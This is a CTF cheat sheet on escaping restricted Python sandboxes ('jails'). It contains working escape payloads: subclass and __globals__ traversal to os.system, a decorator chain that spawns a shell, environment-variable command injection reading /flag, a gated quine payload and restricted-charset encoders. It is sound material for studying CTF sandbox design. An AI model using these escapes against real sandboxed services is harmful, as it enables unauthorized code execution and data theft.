# CTF Misc - Python Jails

## Table of Contents
- [Identifying Jail Type](#identifying-jail-type)
- [Systematic Enumeration](#systematic-enumeration)
  - [Test Basic Features](#test-basic-features)
  - [Test Blocked AST Nodes](#test-blocked-ast-nodes)
  - [Brute-Force Function Names](#brute-force-function-names)
- [Oracle-Based Challenges](#oracle-based-challenges)
  - [Binary Search](#binary-search)
  - [Linear Search](#linear-search)
- [Building Strings Without Concat](#building-strings-without-concat)
- [Classic Escape Techniques](#classic-escape-techniques)
  - [Via Class Hierarchy](#via-class-hierarchy)
  - [Compile Bypass](#compile-bypass)
  - [Unicode Bypass](#unicode-bypass)
  - [Getattr Alternatives](#getattr-alternatives)
- [Walrus Operator Reassignment](#walrus-operator-reassignment)
  - [Octal Escapes](#octal-escapes)
- [Magic Comment Escape](#magic-comment-escape)
- [Mastermind-Style Jails](#mastermind-style-jails)
  - [Find Input Length](#find-input-length)
  - [Find Characters](#find-characters)
  - [Find Positions](#find-positions)
- [Server Communication](#server-communication)
- [Magic File ReDoS](#magic-file-redos)
- [Environment Variable RCE](#environment-variable-rce)
- [func_globals to Module Chain Traversal (PlaidCTF 2013)](#func_globals-to-module-chain-traversal-plaidctf-2013)
- [Restricted Charset Number Generation (PlaidCTF 2013)](#restricted-charset-number-generation-plaidctf-2013)
- [Multi-Stage Payload with Class Attribute Persistence (PlaidCTF 2013)](#multi-stage-payload-with-class-attribute-persistence-plaidctf-2013)
- [Decorator-Based Escape (No Call, No Quotes, No Equals)](#decorator-based-escape-no-call-no-quotes-no-equals)
  - [Technique 1: `function.__name__` as String Keys](#technique-1-function__name__-as-string-keys)
  - [Technique 2: Name Extractor via getset_descriptor](#technique-2-name-extractor-via-getset_descriptor)
  - [Technique 3: Accessing Real Builtins via __loader__](#technique-3-accessing-real-builtins-via-__loader__)
  - [Full Exploit Chain](#full-exploit-chain)
  - [How the Decorator Chain Works (Bottom-Up)](#how-the-decorator-chain-works-bottom-up)
  - [Variations](#variations)
  - [Constraints Checklist for This Technique](#constraints-checklist-for-this-technique)
  - [When __loader__ Is Not Available](#when-__loader__-is-not-available)
- [Quine + Context Detection for Code Execution (BearCatCTF 2026)](#quine--context-detection-for-code-execution-bearcatctf-2026)
- [Restricted Character Repunit Decomposition (BearCatCTF 2026)](#restricted-character-repunit-decomposition-bearcatctf-2026)
- [Hints Cheat Sheet](#hints-cheat-sheet)

---

## Identifying Jail Type

**Error patterns reveal filtering:**

| Error Pattern | Meaning | Approach |
|---------------|---------|----------|
| `name not allowed: X` | Identifier blacklist | Unicode, hex escapes |
| `unknown function: X` | Function whitelist | Brute-force names |
| `node not allowed: X` | AST filtering | Avoid blocked syntax |
| `binop types must be int/bool` | Type restrictions | Use int operations |

---

## Systematic Enumeration

### Test Basic Features
```python
tests = [
    ("1+1", "arithmetic"),
    ("True", "booleans"),
    ("'hello'", "string literals"),
    ("'\\x41'", "hex escapes"),
    ("1==1", "comparison"),
]
```

### Test Blocked AST Nodes
```python
blocked_tests = [
    ("'a'+'b'", "string concat"),
    ("'ab'[0]", "indexing"),
    ("''.join", "attribute access"),
    ("[1,2]", "lists"),
    ("lambda:1", "lambdas"),
]
```

### Brute-Force Function Names
```python
import string
for c in string.printable:
    result = test(f"{c}(65)")
    if "unknown function" not in result:
        print(f"FOUND: {c}()")
```

---

## Oracle-Based Challenges

**Common functions:** `L()`, `Q(i, x)`, `S(guess)`
- `L()` = length of secret
- `Q(i, x)` = compare position i with value x
- `S(guess)` = submit answer

### Binary Search
```python
def find_char(i):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        cmp = query(i, mid)
        if cmp == 0:
            return chr(mid)
        elif cmp == -1:  # mid < flag[i]
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)

flag_len = int(test("L()"))
flag = ''.join(find_char(i) for i in range(flag_len))
```

### Linear Search
```python
for i in range(flag_len):
    for c in range(32, 127):
        if query(i, c) == 0:
            flag += chr(c)
            break
```

---

## Building Strings Without Concat

```python
# Hex escapes
"'\\x66\\x6c\\x61\\x67'"  # => 'flag'

def to_hex_str(s):
    return "'" + ''.join(f'\\x{ord(c):02x}' for c in s) + "'"
```

---

## Classic Escape Techniques

### Via Class Hierarchy
```python
''.__class__.__mro__[1].__subclasses__()
# Find <class 'os._wrap_close'>
```

### Compile Bypass
```python
exec(compile('__import__("os").system("sh")', '', 'exec'))
```

### Unicode Bypass
```python
ｅｖａｌ = eval  # Fullwidth characters
```

### Getattr Alternatives
```python
"{0.__class__}".format('')
vars(''.__class__)
```

---

## Walrus Operator Reassignment

```python
# Reassign constraint variable
(abcdef := "all_allowed_letters")
```

### Octal Escapes
```python
# \141 = 'a', \142 = 'b', etc.
all_letters = '\141\142\143...'
(abcdef := "{all_letters}")
print(open("/flag.txt").read())
```

---

## Magic Comment Escape

```python
# -*- coding: raw_unicode_escape -*-
\u0069\u006d\u0070\u006f\u0072\u0074 os
```

**Useful encodings:**
- `utf-7`
- `raw_unicode_escape`
- `rot_13`

---

## Mastermind-Style Jails

**Output interpretation:**
```text
function("aaa...") => "1 0"  # 1 exists wrong pos, 0 correct
```

### Find Input Length
```python
for length in range(1, 50):
    result = test('a' * length)
    print(f"len={length}: {result}")
```

### Find Characters
```python
for c in charset:
    result = test(c * SECRET_LEN)
    if result[0] + result[1] > 0:
        print(f"{c}: count={result[0] + result[1]}")
```

### Find Positions
```python
known = ""
for pos in range(SECRET_LEN):
    for c in candidate_chars:
        test_str = known + c + 'Z' * (SECRET_LEN - len(known) - 1)
        result = test(test_str)
        if result[1] > len(known):
            known += c
            break
```

---

## Server Communication

```python
from pwn import *
context.log_level = 'error'

def test_with_delay(cmd, delay=5):
    r = remote('host', port, timeout=20)
    r.sendline(cmd.encode())
    import time
    time.sleep(delay)
    try:
        return r.recv(timeout=3).decode()
    except:
        return None
    finally:
        r.close()
```

---

## Magic File ReDoS

**Evil magic file:**
```text
0 regex (a+)+$ Vulnerable pattern
```

**Timing oracle:**
```python
def measure(payload):
    start = time.time()
    requests.post(URL, data={'magic': payload})
    return time.time() - start
```

---

## Environment Variable RCE

```bash
PYTHONWARNINGS=ignore::antigravity.Foo::0
BROWSER="/bin/sh -c 'cat /flag' %s"
```

**Other dangerous vars:**
- `PYTHONSTARTUP` - executed on interactive
- `PYTHONPATH` - inject modules
- `PYTHONINSPECT` - drop to shell

---

## Decorator-Based Escape (No Call, No Quotes, No Equals)

**Pattern (Ergastulum):** `ast.Call` banned, no quotes, no `=`, no commas, charset `a-z0-9()[]:._@\n`. Exec context has `__builtins__={}` and `__loader__=_frozen_importlib.BuiltinImporter`.

**Key insight:** Decorators bypass `ast.Call` — `@expr` on `def name(): body` compiles to `name = expr(func)`, calling `expr` without an `ast.Call` node. This also provides assignment without `=`.

### Technique 1: `function.__name__` as String Keys

Define a function to create a string matching a dict key:
```python
def __builtins__():   # __builtins__.__name__ == "__builtins__"
    0
def exec():           # exec.__name__ == "exec"
    0
```
Use as dict subscript: `some_dict[exec.__name__]` accesses `some_dict["exec"]`.

### Technique 2: Name Extractor via getset_descriptor

`function_type.__dict__['__name__'].__get__` takes a function and returns its `.__name__` string. This enables chained decorators:

```python
@dict_obj.__getitem__        # Step 2: dict["key_name"] → value
@func.__class__.__dict__[__name__.__name__].__get__  # Step 1: extract .__name__
def key_name():              # function with __name__ == "key_name"
    0
# Result: key_name = dict_obj["key_name"]
```

### Technique 3: Accessing Real Builtins via __loader__

```python
__loader__.load_module.__func__.__globals__["__builtins__"]
```
Contains real `exec`, `__import__`, `print`, `compile`, `chr`, `type`, `getattr`, `setattr`, etc.

### Full Exploit Chain

```python
# Step 1: Define helper functions for string key extraction
def __builtins__():
    0
def __name__():
    0
def __import__():
    0

# Step 2: Extract real __import__ from loader's globals
# Equivalent to: __import__ = globals_dict["__builtins__"]["__import__"]
@__loader__.load_module.__func__.__globals__[__builtins__.__name__].__getitem__
@__builtins__.__class__.__dict__[__name__.__name__].__get__
def __import__():
    0

# Step 3: Import os module
# Equivalent to: os = __import__("os")
@__import__
@__builtins__.__class__.__dict__[__name__.__name__].__get__
def os():
    0

# Step 4: Get a shell
# Equivalent to: sh = os.system("sh")
@os.system
@__builtins__.__class__.__dict__[__name__.__name__].__get__
def sh():
    0
```

### How the Decorator Chain Works (Bottom-Up)

```python
@outer_func
@inner_func
def name():
    0
```
Executes as: `name = outer_func(inner_func(function_named_name))`

For the `__import__` extraction:
1. `__builtins__.__class__` → `<class 'function'>` (type of our defined function)
2. `.__dict__[__name__.__name__]` → `function.__dict__["__name__"]` → getset_descriptor
3. `.__get__` → descriptor's getter (takes function, returns its `.__name__` string)
4. Applied to `def __import__(): 0` → returns string `"__import__"`
5. `globals_dict["__builtins__"].__getitem__("__import__")` → real `__import__` function

### Variations

**Execute arbitrary code via exec + code object:**
```python
def __code__():
    0
@exec_function
@__builtins__.__class__.__dict__[__code__.__name__].__get__
def payload():
    ... # code to execute (still subject to charset/AST restrictions)
```

**Import any module by name:**
```python
@__import__
@__builtins__.__class__.__dict__[__name__.__name__].__get__
def subprocess():  # or any valid module name using allowed chars
    0
```

### Constraints Checklist for This Technique

- [x] No `ast.Call` nodes (decorators are `ast.FunctionDef` with decorator_list)
- [x] No quotes (strings from `function.__name__`)
- [x] No `=` sign (decorators provide assignment)
- [x] No commas (single-argument decorator calls)
- [x] No `+`, `*`, operators (pure attribute/subscript chains)
- [x] Works with empty `__builtins__` (accesses real builtins via `__loader__`)

### When __loader__ Is Not Available

If `__loader__` isn't in scope but you have any function object `f`:
- `f.__class__` → function type
- `f.__globals__` → module globals where `f` was defined
- `f.__globals__["__builtins__"]` → real builtins (if `f` is from a normal module)

If you have a class `C`:
- `C.__init__.__globals__` → globals of the module defining `C`

**References:** 0xL4ugh CTF 2025 "Ergastulum" (442pts, Elite), GCTF 2022 "Treebox"

---

## Quine + Context Detection for Code Execution (BearCatCTF 2026)

**Pattern (The Boy is Quine):** Server asks for a quine (program that prints its own source code), validates it by running in a subprocess, then `exec()`s it in the main process with different globals.

**Exploit:** Build a dual-purpose quine that:
1. Prints itself (passes quine validation in subprocess)
2. Executes payload only in the server process (detected via globals difference)

```python
# Context gate: "subprocess" module exists in server globals but not in subprocess
s='s=%r;print(s%%s,end="");__import__("os").system("cat /app/flag.txt")if"subprocess"in globals()else 0';print(s%s,end="");__import__("os").system("cat /app/flag.txt")if"subprocess"in globals()else 0
```

**Key insight:** `exec()` in the server process inherits the server's globals (imported modules like `subprocess`), while the subprocess validation has a clean environment. Use `"module_name" in globals()` or `"module_name" in dir()` as a gate to distinguish contexts. The quine structure `s='s=%r;...';print(s%s,end="")` is the classic Python quine pattern.

---

## Restricted Character Repunit Decomposition (BearCatCTF 2026)

**Pattern (The Brig):** Pick exactly 2 characters for your entire expression. Server evaluates `eval(long_to_bytes(eval(expr)))` — the outer eval runs the decoded Python code.

**Strategy:** Choose `1` and `+`. Decompose the target integer into a sum of repunits (111, 1111, 11111, etc.):
```python
from Crypto.Util.number import bytes_to_long

target = bytes_to_long(b'eval(input())')  # → 13-byte integer

def repunit(k):
    return (10**k - 1) // 9  # 111...1 with k digits

terms = []
remaining = target
while remaining > 0:
    k = 1
    while repunit(k + 1) <= remaining:
        k += 1
    terms.append('1' * k)
    remaining -= repunit(k)

expr = '+'.join(terms)  # e.g., "111...1+111...1+11+1+1"
# len(expr) ≈ 2561 chars (fits 4096 limit)
```

**Key insight:** Any positive integer can be written as a sum of repunits (numbers like 1, 11, 111, ...). The greedy algorithm produces ~O(log²(n)) terms. This converts a 2-character constraint into arbitrary code execution via `long_to_bytes()`. On the second unrestricted prompt, run `open('/flag.txt').read()`.

**Detection:** Challenge restricts input character set to exactly 2 characters. Double-eval pattern (`eval(decode(eval(...)))`).

---

## Hints Cheat Sheet

| Hint | Meaning |
|------|---------|
| "I love chars" | Single-char functions |
| "No words" | Multi-char blocked |
| "Oracle" | Query functions to leak |
| "knight/chess" | Mastermind game |

---

## func_globals to Module Chain Traversal (PlaidCTF 2013)

**Pattern:** Access `os.system` through the `func_globals` dictionary of a loaded class's method, without importing any modules.

```python
# Step 1: Find catch_warnings in subclass list (commonly index 49 or 59)
[x for x in ().__class__.__base__.__subclasses__()
    if x.__name__ == "catch_warnings"][0]

# Step 2: Access func_globals via __init__ or __repr__
g = ().__class__.__base__.__subclasses__()[59].__init__.func_globals
# Python 2: .__init__.im_func.func_globals
# Python 3: .__init__.__globals__

# Step 3: Traverse module chain: warnings → linecache → os
g["linecache"].__dict__["os"].system("cat /flag.txt")

# One-liner:
().__class__.__base__.__subclasses__()[59].__init__.__globals__["linecache"].__dict__["os"].system("id")
```

**Key insight:** The `warnings.catch_warnings` class is almost always loaded. Its `__init__.__globals__` contains a reference to `linecache`, which imports `os`. This chain avoids direct `import` statements. The subclass index varies by Python version — enumerate with `[(i,x.__name__) for i,x in enumerate(''.__class__.__mro__[1].__subclasses__())]`.

---

## Restricted Charset Number Generation (PlaidCTF 2013)

**Pattern:** Generate arbitrary integers using only `~` (bitwise NOT), `<<` (left shift), `[]<[]` (False=0), and `{}<[]` (True=1) when numeric literals are forbidden.

```python
def brainfuckize(nb):
    """Convert integer to expression using only ~, <<, <, [], {}"""
    if nb == -2: return "~({}<[])"    # ~True = -2
    if nb == -1: return "~([]<[])"    # ~False = -1
    if nb == 0:  return "([]<[])"     # False = 0
    if nb == 1:  return "({}<[])"     # True = 1
    if nb % 2:   return f"~{brainfuckize(~nb)}"  # Odd: ~(complement)
    return f"({brainfuckize(nb//2)}<<({{}}<[]))"   # Even: half << 1

# brainfuckize(65) → "(~(~([]<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))"
# Then use: "%c" % 65 → "A"
```

**Key insight:** Combine with `"%c" % ascii_value` to build arbitrary strings character by character. This bypasses jails that strip all alphanumeric characters while allowing operators and brackets.

---

## Multi-Stage Payload with Class Attribute Persistence (PlaidCTF 2013)

**Pattern:** Store intermediate code fragments across multiple jail submissions by writing to class attributes of subclasses.

```python
# Stage 1: Store code fragment on a subclass
().__class__.__base__.__subclasses__()[-2].payload = "import os; os.system('cat /flag.txt')"

# Stage 2 (next submission): Retrieve and execute
exec(().__class__.__base__.__subclasses__()[-2].payload)
```

**Key insight:** Class attributes persist across separate `eval()`/`exec()` calls within the same process. If the jail limits input length but allows multiple submissions, split the payload across submissions using subclass attributes as storage. Use `IncrementalDecoder` or any persistent subclass as the storage target.
